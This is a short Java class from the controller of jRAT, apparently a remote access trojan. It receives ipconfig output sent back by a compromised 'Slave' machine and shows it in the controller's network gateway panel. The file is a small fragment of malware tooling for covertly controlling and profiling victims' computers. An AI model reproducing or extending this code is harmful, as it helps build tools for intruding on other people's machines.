package se.jrat.controller.packets.incoming;

import java.io.DataInputStream;

import se.jrat.controller.Slave;
import se.jrat.controller.ui.frames.FrameControlPanel;
import se.jrat.controller.ui.panels.PanelControlNetGateway;


public class Packet50IPConfig extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String ipconfig = slave.readLine();

		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		PanelControlNetGateway panel = null;
		if (frame != null) {
			panel = (PanelControlNetGateway) frame.panels.get("net gateway");
			panel.getPane().setText(ipconfig);
		}
	}

}
